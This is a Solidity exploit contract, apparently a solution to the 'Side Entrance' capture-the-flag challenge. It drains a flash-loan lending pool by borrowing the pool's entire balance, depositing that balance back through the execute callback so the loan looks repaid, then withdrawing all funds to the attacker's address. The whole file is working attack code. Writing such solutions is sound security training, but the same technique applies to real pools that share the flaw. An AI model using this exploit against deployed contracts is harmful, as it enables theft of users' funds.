// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool{
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideCracker {

    ISideEntranceLenderPool public immutable pool;
    address attacker;
     
    constructor(address _poolAddress) {
        pool = ISideEntranceLenderPool(_poolAddress);
        attacker = msg.sender;
    }
    
    receive() external payable {}

    function drainPool() public payable {
        callFlashLoan();

        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

    function callFlashLoan() public {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function execute() external payable { 
        pool.deposit{value: msg.value}();
    }

}
